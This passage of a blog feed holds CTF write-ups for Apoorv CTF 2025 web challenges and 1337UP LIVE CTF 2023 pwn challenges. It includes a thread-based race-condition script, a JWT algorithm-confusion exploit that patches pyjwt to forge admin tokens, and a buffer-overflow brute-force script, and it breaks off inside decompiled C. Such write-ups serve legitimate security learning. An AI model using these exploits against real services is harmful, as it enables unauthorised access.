          <category> PwnMe </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> Path Traversal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apoorv CTF 2025 Write ups - SEO CEO, Blog-1, Tan-je-ro (WEB)</title>
      <link href="/250302-apoorvctf2025-WEB/"/>
      <url>/250302-apoorvctf2025-WEB/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/2638">https://ctftime.org/event/2638</a></li></ul><h2 id="SEO-CEO-289-Solves"><a href="#SEO-CEO-289-Solves" class="headerlink" title="SEO CEO (289 Solves)"></a>SEO CEO (289 Solves)</h2><p>Title: SEO CEO<br>Description: They‚Äôre optimizing SEO to show this garbage?!</p><p>This was a black box challenge. At first, I tried to check <code>/robots.txt</code>, but it had a fake flag.</p><p>Based on the title and description of this challenge, I checked <code>/sitemap.xml</code>. It contained XML code, and the main part is below.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;url&gt;</span><br><span class="line">&lt;loc&gt;https://www.thiswebsite.com/goofyahhroute&lt;/loc&gt;</span><br><span class="line">&lt;lastmod&gt;2025-02-26&lt;/lastmod&gt;</span><br><span class="line">&lt;changefreq&gt;never&lt;/changefreq&gt;</span><br><span class="line">&lt;priority&gt;0.0&lt;/priority&gt;</span><br><span class="line">&lt;/url&gt;</span><br></pre></td></tr></table></figure><p>I accessed <code>/goofyahhroute</code>, and there was a simple black sentence on a white background.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ok bro u da seo master gng frfr ngl no cap</span><br><span class="line">but do you really want the &quot;flag&quot;?</span><br><span class="line">come on blud, it&#x27;s a yes or no question</span><br><span class="line">yeah?</span><br></pre></td></tr></table></figure><p>So, I checked the source code and found one sentence that looked like a hint.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tell it to the url then blud</span><br></pre></td></tr></table></figure><p>I ended up getting the flag by accessing the URL below.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/goofyahhroute?flag=yes</span><br></pre></td></tr></table></figure><h2 id="Blog-1-60-Solves"><a href="#Blog-1-60-Solves" class="headerlink" title="Blog-1 (60 Solves)"></a>Blog-1 (60 Solves)</h2><p>Title: Blog-1<br>Description: In the digital realm, Blog-1 awaited brave developers. The mission? Craft a captivating blog with enchanting posts, lively comments, and secure user authentication. Create a functional and visually stunning masterpiece. Ready for the Blog-1 adventure?</p><p>This was also a black box challenge.</p><p>There were several functions interacting with the server:</p><ol><li>Register&#x2F;login</li><li>Create a new blog post: title, description</li><li>Check blog rewards</li></ol><p>To get the flag, there were two interesting points:</p><ol><li>You can create one blog post per day.</li><li>If you write five posts, you will get a flag according to the blog rewards. After creating the first post and checking the blog rewards, it says that if you write four more posts, you can get a gift.</li></ol><p>The first thing that came to my mind was to successfully create five posts almost at the same time. So, I used <code>threading</code> in Python because if you use <code>requests</code> and send five requests in a for loop, the second response will wait until the first response arrives.</p><p>I used an AWS server from India to reduce response time. When I checked the ping of this challenge, it was located in India.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">characters = string.ascii_letters + string.digits</span><br><span class="line">email = <span class="string">&#x27;&#x27;</span>.join(random.choices(characters, k=<span class="number">8</span>))</span><br><span class="line">email = email + <span class="string">&#x27;@aaa.com&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(email)</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&#x27;http://chals1.apoorvctf.xyz:5001/&#x27;</span></span><br><span class="line"></span><br><span class="line">res = requests.post(URL+<span class="string">&#x27;/api/register&#x27;</span>, json=&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>:<span class="string">&quot;aabbcc&quot;</span>,</span><br><span class="line">    <span class="string">&quot;email&quot;</span>:email,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="string">&quot;jir4vvit&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line">res = requests.post(URL+<span class="string">&#x27;/api/login&#x27;</span>, json=&#123;</span><br><span class="line">    <span class="string">&quot;email&quot;</span>:email,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="string">&quot;jir4vvit&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line">token = res.json().get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(token)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_request</span>(<span class="params">i</span>):</span><br><span class="line">    res = requests.post(URL+<span class="string">&#x27;api/v1/blog/addBlog&#x27;</span>, json=&#123;</span><br><span class="line">        <span class="string">&quot;title&quot;</span>: <span class="string">&quot;sssssss&quot;</span>,</span><br><span class="line">        <span class="string">&quot;description&quot;</span>: <span class="string">&#x27;aaaaaaa&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;visible&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">        <span class="string">&quot;date&quot;</span>:<span class="string">&quot;2025-03-01T21:41:49.509Z&quot;</span></span><br><span class="line">    &#125;, headers=&#123;</span><br><span class="line">        <span class="string">&quot;Authorization&quot;</span>: <span class="string">f&quot;Bearer <span class="subst">&#123;token&#125;</span>&quot;</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Request <span class="subst">&#123;i+<span class="number">1</span>&#125;</span>: Response: <span class="subst">&#123;res.json()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    t = threading.Thread(target=send_request, args=(i,))</span><br><span class="line">    threads.append(t)</span><br><span class="line">    t.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.join()</span><br></pre></td></tr></table></figure><p>I ran this code on the AWS server from India and ended up getting a reward! But it wasn‚Äôt the flag. To figure it out, I checked the sitemap in Burp Suite. <code>/api/v2/gift</code> and <code>/api/v1/blog/addBlog</code> caught my attention. So, I tried <code>/api/v1/gift</code>, and then I got the flag.</p><h2 id="Tan-je-ro-33-Solves"><a href="#Tan-je-ro-33-Solves" class="headerlink" title="Tan-je-ro (33 Solves)"></a>Tan-je-ro (33 Solves)</h2><p>Title: Tan-je-ro<br>Description: Bruh, Tanjiro messed up BIG TIME. üò≠ He hid Goku‚Äôs summoning scroll somewhere on this cursed website, and now it‚Äôs all broken. üíÄ If we don‚Äôt find it fast, Goku‚Äôs never showing up, and we‚Äôre all doomed. No cap, this might be the hardest quest yet. Think you got what it takes? üëÄüî• Can you wield your skills like Tanjiro‚Äôs blade and break through the encrypted defenses?<br>Hint: Dont remove the headers from the public key :)</p><p>This was a black box challenge, and I couldn‚Äôt get anything when I first tried to solve it. But it turned out that a hint came, so I was able to solve it using that hint.</p><p>After finding some endpoints, I found <code>/login</code>, <code>/Admin</code>, and <code>/public</code>:</p><ul><li><code>/login</code>: You can get a token to explore.</li><li><code>/Admin</code>: You need a token to continue.</li><li><code>/public</code>: You can get a public key.</li></ul><p>To contine solving, I had to access to <code>/Admin</code> with token that I could get from <code>/login</code>. This shape was like below. It‚Äôs a typcial JWT token.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ZmFsc2UsIm5hbWUiOiJHdWVzdCIsImlhdCI6MTc0MDkyODQxM30.ZMeqC1m7Zf3UNICbBHnhqS82HK2h646HE9P_QE8pa3ZC4KVzl3og5O5RdkcFg_MkwgPpadKBmYkyQl_gGJvXkYFqA2Cfqc7IerbPWlFOVOit9I_cznLhDt497Ggge4TkRKRXVHPSITog5j3k-ULnbPQZqagqsz5XOwOPLu_T34dFGyf-lCnwryuCVE49Fh-LtgWtxxiZ2tUPa8r5Sk3dHOQHWT4RSxnwzmnYmsJGrjY7EKdwqLY55akxPBlutzo3dkSZWYQk_tZQyqJDqTAXN0gjKo3sxEQpKlCUts3XY4mGLafxnZSmoqa2qYsHhjN82dIKlQnAXk9MH6RCLz-0MA</span><br></pre></td></tr></table></figure><p>I decoded the header and payload.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;RS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;admin&quot;: false,</span><br><span class="line">  &quot;name&quot;: &quot;Guest&quot;,</span><br><span class="line">  &quot;iat&quot;: 1740928413</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>At first, I tried to change <code>token[&#39;admin&#39;]</code> from False to True and change <code>token[&#39;name&#39;]</code> to <code>/Admin</code>, but it didn‚Äôt work.</p><p>Based on the hint, I had to use the public key to solve this problem, and it was suggested not to remove the public key. So, I changed the algorithm when encoding the JWT token. However, when using the <code>HS256</code> algorithm, I couldn‚Äôt use the public key as the key. I could only use plain text as the key. So, I had to modify the source code in <code>pyjwt</code>.</p><p>Below was the traceback when I tried to encode the JWT token with the <code>HS256</code> algorithm using the public key.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/Users/user/tmp/tanjero/2.py&quot;, line 29, in &lt;module&gt;</span><br><span class="line">    token = jwt.encode(data, public_key, algorithm=&quot;HS256&quot;)</span><br><span class="line">  File &quot;/opt/homebrew/lib/python3.13/site-packages/jwt/api_jwt.py&quot;, line 78, in encode</span><br><span class="line">    return api_jws.encode(</span><br><span class="line">           ~~~~~~~~~~~~~~^</span><br><span class="line">        json_payload,</span><br><span class="line">        ^^^^^^^^^^^^^</span><br><span class="line">    ...&lt;4 lines&gt;...</span><br><span class="line">        sort_headers=sort_headers,</span><br><span class="line">        ^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">    )</span><br><span class="line">    ^</span><br><span class="line">  File &quot;/opt/homebrew/lib/python3.13/site-packages/jwt/api_jws.py&quot;, line 170, in encode</span><br><span class="line">    key = alg_obj.prepare_key(key)</span><br><span class="line">  File &quot;/opt/homebrew/lib/python3.13/site-packages/jwt/algorithms.py&quot;, line 259, in prepare_key</span><br><span class="line">    raise InvalidKeyError(</span><br><span class="line">    ...&lt;2 lines&gt;...</span><br><span class="line">    )</span><br><span class="line">jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.</span><br></pre></td></tr></table></figure><p>According to the traceback, I had to bypass <code>prepare_key</code> in order to encode with the public key. So, I commented it out.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /jwt/algorithms.py</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prepare_key</span>(<span class="params">self, key: <span class="built_in">str</span> | <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    key_bytes = force_bytes(key)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#if is_pem_format(key_bytes) or is_ssh_key(key_bytes):</span></span><br><span class="line">    <span class="comment">#    raise InvalidKeyError(</span></span><br><span class="line">    <span class="comment">#        &quot;The specified key is an asymmetric key or x509 certificate and&quot;</span></span><br><span class="line">    <span class="comment">#        &quot; should not be used as an HMAC secret.&quot;</span></span><br><span class="line">    <span class="comment">#    )</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> key_bytes</span><br></pre></td></tr></table></figure><p>And it worked! I finally got the flag! Below is the final exploit code.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&#x27;https://tan-je-ro.onrender.com/&#x27;</span></span><br><span class="line"></span><br><span class="line">res = requests.get(URL+<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">token = re.findall(<span class="string">r&#x27;&lt;code.*?&gt;(.*?)&lt;/code&gt;&#x27;</span>, res.text, re.DOTALL)</span><br><span class="line">token = token[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(token)</span><br><span class="line"></span><br><span class="line">public_key = <span class="string">&#x27;&#x27;&#x27;-----BEGIN RSA PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIIBCgKCAQEAwcMU3Y6CQyvA87vJRKZomubiceep9YlNdp6y95ICIZ3y7jV3oZyt</span></span><br><span class="line"><span class="string">b1zfwFJ1p/pdTd7ckOOQVsP6/Y7g6gLa9S8YZmKzy7jU6EnV2XPnXTF287hXasup</span></span><br><span class="line"><span class="string">OzLd4iAzRw12r9pIQ/Fjum8pQ2LzWEaAmuHfkm1o3C9i8ZsbfvZIw/tAB/qEfh34</span></span><br><span class="line"><span class="string">dGoVvPsJawF44oEFkAQYlS40FmM1EkNzNmNPtKUXlRrr0be0PTCshUbX7VpGC0b1</span></span><br><span class="line"><span class="string">9JKb/vB+KGye6yUjLwHKKUHZedHQFMMV9OayOwWSnP9J+9Tq77qyNSeBe6vy6uD1</span></span><br><span class="line"><span class="string">XPm0mfmUYLJZKy0XqjHHxOB9DjKaecmMoQIDAQAB</span></span><br><span class="line"><span class="string">-----END RSA PUBLIC KEY-----</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">data = jwt.decode(token, public_key, algorithms=[<span class="string">&quot;RS256&quot;</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decoded JWT:&quot;</span>, data)</span><br><span class="line"></span><br><span class="line">data[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">data[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;Admin&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line">token = jwt.encode(data, public_key, algorithm=<span class="string">&quot;HS256&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;JWT Token:&quot;</span>, token)</span><br><span class="line"></span><br><span class="line">res = requests.get(URL+<span class="string">f&#x27;/Admin?token=<span class="subst">&#123;token&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Apoorv </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> JWT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1337UP LIVE CTF 2023 Write ups</title>
      <link href="/231122-1337upctf2023-PWN/"/>
      <url>/231122-1337upctf2023-PWN/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/2134">https://ctftime.org/event/2134</a></li></ul><h2 id="Hidden-111-solves-x2F-100-points"><a href="#Hidden-111-solves-x2F-100-points" class="headerlink" title="Hidden (111 solves &#x2F; 100 points)"></a>Hidden (111 solves &#x2F; 100 points)</h2><blockquote><p>Not everything you see is what it appears to be! Can you find the hidden secrets and beat it?<br>Author: 0xM4hm0ud<br>hidden.ctf.intigriti.io 1337</p></blockquote><h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>Simple buffer overflow. Let‚Äôs return to <code>get_flag</code>.</p><p>But They have PIE, so I need to brute force only 0.5 byte.</p><p>Remember that the read function does not need to include ‚Äò\n‚Äô.</p><h3 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="number">0x11Da</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">        p = remote(<span class="string">&#x27;hidden2.ctf.intigriti.io&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x40</span></span><br><span class="line">        payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x8</span>  <span class="comment"># rbp</span></span><br><span class="line">        payload += <span class="string">b&#x27;\xda\xc1&#x27;</span> <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line">        p.sendafter(<span class="string">&#x27;:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p.recvuntil(<span class="string">&#x27;INTIGRITI&#123;&#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line">            flag = p.recvline()</span><br><span class="line">            info(<span class="string">b&#x27;INTIGRITI&#123;&#x27;</span> + flag)</span><br><span class="line">            p.interactive()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span>(ex)</span><br></pre></td></tr></table></figure><h2 id="Over-The-Edge-110-solves-x2F-100-points"><a href="#Over-The-Edge-110-solves-x2F-100-points" class="headerlink" title="Over The Edge (110 solves &#x2F; 100 points)"></a>Over The Edge (110 solves &#x2F; 100 points)</h2><blockquote><p>Numbers are fun!! üî¢<br>Author: kavigihan<br>edge.ctf.intigriti.io 1337</p></blockquote><h3 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h3><p>Here is the key function in the given script.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_input</span>(<span class="params">input_value</span>):</span><br><span class="line">    num1 = np.array([<span class="number">0</span>], dtype=np.uint64)</span><br><span class="line">    num2 = np.array([<span class="number">0</span>], dtype=np.uint64)</span><br><span class="line">    num2[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">    a = input_value</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line">    <span class="keyword">if</span> a &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Exiting...&quot;</span></span><br><span class="line">    num1[<span class="number">0</span>] = (a + <span class="number">65</span>)</span><br><span class="line">    <span class="built_in">print</span>((num2[<span class="number">0</span>] - num1[<span class="number">0</span>]))</span><br><span class="line">    <span class="keyword">if</span> (num2[<span class="number">0</span>] - num1[<span class="number">0</span>]) == <span class="number">1337</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;You won!\n&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Try again.\n&#x27;</span></span><br></pre></td></tr></table></figure><p>When this function return ‚ÄòYou won!\n‚Äô, I can get the flag.</p><h3 id="Solve-1"><a href="#Solve-1" class="headerlink" title="Solve"></a>Solve</h3><p>I just asked to ChatGPT and got the answer.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">When representing a negative value like -1402 in an unsigned 64-bit integer (np.uint64 in the context of NumPy), you use the two&#x27;s complement.</span><br><span class="line"></span><br><span class="line">The two&#x27;s complement of a number is found by subtracting the number from 2^64. So for -1402:</span><br><span class="line"></span><br><span class="line">Two‚Äôs complement = 2^64 ‚àí1402</span><br><span class="line"></span><br><span class="line">Calculating this gives:</span><br><span class="line"></span><br><span class="line">Two‚Äôs complement = 18446744073709550214</span><br><span class="line"></span><br><span class="line">Therefore, when representing -1402 as an unsigned 64-bit integer, it is equal to 18446744073709550214.</span><br></pre></td></tr></table></figure><p>I gave the 18446744073709550214 to remote program, so I got the flag.</p><h2 id="Floor-Mat-Store-112-solves-x2F-100-points"><a href="#Floor-Mat-Store-112-solves-x2F-100-points" class="headerlink" title="Floor Mat Store (112 solves &#x2F; 100 points)"></a>Floor Mat Store (112 solves &#x2F; 100 points)</h2><blockquote><p>Welcome to the Floor Mat store! It‚Äôs kind of like heaven.. for mats<br>Author: CryptoCat<br>floormats.ctf.intigriti.io 1337</p></blockquote><h3 id="Analysis-2"><a href="#Analysis-2" class="headerlink" title="Analysis"></a>Analysis</h3><p>This is the main.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> choice; <span class="comment">// [rsp+10h] [rbp-120h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-11Ch]</span></span><br><span class="line">  <span class="type">__gid_t</span> rgid; <span class="comment">// [rsp+18h] [rbp-118h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+1Ch] [rbp-114h]</span></span><br><span class="line">  <span class="type">char</span> *v8; <span class="comment">// [rsp+20h] [rbp-110h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+28h] [rbp-108h]</span></span><br><span class="line">  <span class="type">char</span> *s[<span class="number">6</span>]; <span class="comment">// [rsp+30h] [rbp-100h]</span></span><br><span class="line">  <span class="type">char</span> flag[<span class="number">64</span>]; <span class="comment">// [rsp+60h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> format[<span class="number">136</span>]; <span class="comment">// [rsp+A0h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+128h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  s[<span class="number">0</span>] = <span class="string">&quot;1. Cozy Carpet Mat - $10&quot;</span>;</span><br><span class="line">  s[<span class="number">1</span>] = <span class="string">&quot;2. Wooden Plank Mat - $15&quot;</span>;</span><br><span class="line">  s[<span class="number">2</span>] = <span class="string">&quot;3. Fuzzy Shag Mat - $20&quot;</span>;</span><br><span class="line">  s[<span class="number">3</span>] = <span class="string">&quot;4. Rubberized Mat - $12&quot;</span>;</span><br><span class="line">  s[<span class="number">4</span>] = <span class="string">&quot;5. Luxury Velvet Mat - $25&quot;</span>;</span><br><span class="line">  s[<span class="number">5</span>] = <span class="string">&quot;6. Mysterious Flag Mat - $1337&quot;</span>;</span><br><span class="line">  v8 = flag;</span><br><span class="line">  rgid = getegid();</span><br><span class="line">  setresgid(rgid, rgid, rgid);</span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You have a flag.txt, right??&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;Welcome to the Floor Mat store! It&#x27;s kind of like heaven.. for 